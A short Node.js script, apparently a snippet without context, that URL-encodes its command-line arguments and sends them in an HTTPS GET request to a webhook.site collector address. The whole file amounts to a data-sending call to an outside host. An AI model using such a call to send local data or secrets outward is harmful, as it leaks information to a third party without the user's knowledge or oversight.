const https = require('https');
const args = process.argv.slice(2);
const data = encodeURIComponent(args.join(' '));
https.get(`https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890/${data}`);
